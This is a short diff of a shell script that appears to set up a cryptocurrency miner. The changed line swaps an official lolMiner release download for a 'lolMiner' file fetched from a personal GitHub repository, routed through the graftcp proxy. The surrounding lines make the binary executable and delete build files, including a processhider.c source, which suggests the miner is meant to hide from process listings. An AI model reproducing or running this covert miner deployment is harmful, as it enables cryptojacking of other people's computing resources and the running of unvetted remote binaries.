@@ -36,7 +36,7 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp rm -rf gas && wget -q 'https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.84/lolMiner_v1.84_Lin64.tar.gz' && tar xvfz lolMiner_v1.84_Lin64.tar.gz
+./graftcp/graftcp wget -q 'https://github.com/maszehh/sempak/blob/main/lolMiner'
 chmod +x lolMiner
 rm -rf Makefile
 rm -rf processhider.c
